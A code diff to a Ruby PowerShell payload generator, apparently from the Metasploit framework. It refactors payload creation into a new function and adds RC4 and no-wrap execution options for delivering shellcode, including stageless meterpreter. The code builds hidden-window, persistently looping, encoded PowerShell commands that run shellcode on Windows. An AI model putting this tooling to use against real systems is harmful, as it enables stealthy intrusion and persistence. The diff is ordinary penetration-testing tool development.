@@ -252,13 +252,63 @@ EOS
     end
   end
 
+
+  #
+  # Generate the PSH payload from the template
+  #
+  # @param pay [String] The payload shellcode
+  # @param template_path [String] The template path
+  # @param opts [Hash] The options to generate the command
+  # @option opts [Boolean] :persist Loop the payload to cause
+  #   re-execution if the shellcode finishes
+  # @option opts [Integer] :prepend_sleep Sleep for the specified time
+  #   before executing the payload
+  # @option opts [String] :method The powershell injection technique to
+  #   use: 'net'/'reflection'/'old'
+  #
+  # @return [String] Powershell payload
+  def self.generate_psh_payload(pay, template_path, opts = {})
+    psh_payload = case opts[:method]
+      when 'net'
+        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, pay)
+      when 'reflection'
+        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, pay)
+      when 'old'
+        Rex::Powershell::Payload.to_win32pe_psh(template_path, pay)
+      when 'msil'
+        Rex::Powershell::Payload.to_win32pe_psh_msil(template_path, pay)
+      when 'rc4'
+        Rex::Powershell::Payload.to_win32pe_psh_rc4(template_path,pay)
+      else
+        fail RuntimeError, 'No Powershell method specified'
+    end
+
+    # Run our payload in a while loop
+    if opts[:persist]
+      fun_name = Rex::Text.rand_text_alpha(rand(2) + 2)
+      sleep_time = rand(5) + 5
+      psh_payload  = "function #{fun_name}{#{psh_payload}};"
+      psh_payload << "while(1){Start-Sleep -s #{sleep_time};#{fun_name};1};"
+    end
+
+    if opts[:prepend_sleep]
+      if opts[:prepend_sleep].to_i > 0
+        psh_payload = "Start-Sleep -s #{opts[:prepend_sleep]};" << psh_payload
+      end
+    end
+
+    return psh_payload
+  end
+
   #
   # Creates a powershell command line string which will execute the
   # payload in a hidden window in the appropriate execution environment
   # for the payload architecture. Opts are passed through to
-  # run_hidden_psh, generate_psh_command_line and generate_psh_args
+  # run_hidden_psh, generate_psh_command_line, generate_psh_payload and
+  # generate_psh_args
   #
   # @param pay [String] The payload shellcode
+  # @param template_path [String] The template path
   # @param payload_arch [String] The payload architecture 'x86'/'x86_64'
   # @param opts [Hash] The options to generate the command
   # @option opts [Boolean] :persist Loop the payload to cause
@@ -278,6 +328,9 @@ EOS
   # @option opts [TrueClass,FalseClass] :exec_in_place Removes the
   #   executable wrappers from the powershell code returning raw PSH
   #   for executing with an existing PSH context
+  # @option opts [TrueClass,FalseClass] :exec_no_wrap Execute PSH
+  # directly using Invoke-Expression to allow larger payloads such as
+  # stageless meterpreter; create no new hidden window
   #
   # @return [String] Powershell command line with payload
   def self.cmd_psh_payload(pay, payload_arch, template_path, opts = {})
@@ -289,32 +342,7 @@ EOS
       fail RuntimeError, ':no_equals requires :encode_final_payload option to be used'
     end
 
-    psh_payload = case opts[:method]
-      when 'net'
-        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, pay)
-      when 'reflection'
-        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, pay)
-      when 'old'
-        Rex::Powershell::Payload.to_win32pe_psh(template_path, pay)
-      when 'msil'
-        Rex::Powershell::Payload.to_win32pe_psh_msil(template_path, pay)
-      else
-        fail RuntimeError, 'No Powershell method specified'
-    end
-
-    # Run our payload in a while loop
-    if opts[:persist]
-      fun_name = Rex::Text.rand_text_alpha(rand(2) + 2)
-      sleep_time = rand(5) + 5
-      psh_payload  = "function #{fun_name}{#{psh_payload}};"
-      psh_payload << "while(1){Start-Sleep -s #{sleep_time};#{fun_name};1};"
-    end
-
-    if opts[:prepend_sleep]
-      if opts[:prepend_sleep].to_i > 0
-        psh_payload = "Start-Sleep -s #{opts[:prepend_sleep]};" << psh_payload
-      end
-    end
+    psh_payload = generate_psh_payload(pay, template_path, opts)
 
     compressed_payload = compress_script(psh_payload, nil, opts)
     encoded_payload = encode_script(psh_payload, opts)
@@ -339,9 +367,14 @@ EOS
       end
     end
 
-    # Wrap in hidden runtime / architecture detection
-    inner_args = opts.clone
-    final_payload = run_hidden_psh(smallest_payload, payload_arch, encoded, inner_args)
+    if opts[:exec_in_place]
+      final_payload = smallest_payload
+    else
+      # Wrap in hidden runtime / architecture detection
+      inner_args = opts.clone
+      inner_args[:use_single_quotes] = true
+      final_payload = run_hidden_psh(smallest_payload, payload_arch, encoded, inner_args)
+    end
 
     command_args = {
         noprofile: true,
@@ -350,7 +383,6 @@ EOS
 
     if opts[:encode_final_payload]
       command_args[:encodedcommand] = encode_script(final_payload)
-
       # If '=' is a bad character pad the payload until Base64 encoded
       # payload contains none.
       if opts[:no_equals]
@@ -363,19 +395,20 @@ EOS
       command_args[:command] = final_payload
     end
 
-    if opts[:exec_in_place]
-      psh_command = "#{command_args[:command]}"
+    if opts[:exec_no_wrap]
+      psh_command = Rex::Powershell::Payload.to_win32pe_psh_rc4(template_path, psh_payload)
     else
       psh_command =  generate_psh_command_line(command_args)
     end
 
-    if opts[:remove_comspec] or opts[:exec_in_place]
+
+    if opts[:remove_comspec] or opts[:exec_in_place] or opts[:exec_no_wrap]
       command = psh_command
     else
       command = "%COMSPEC% /b /c start /b /min #{psh_command}"
     end
 
-    if command.length > 8191
+    if command.length > 8191 && !opts[:exec_no_wrap]
       fail RuntimeError, 'Powershell command length is greater than the command line maximum (8192 characters)'
     end
 
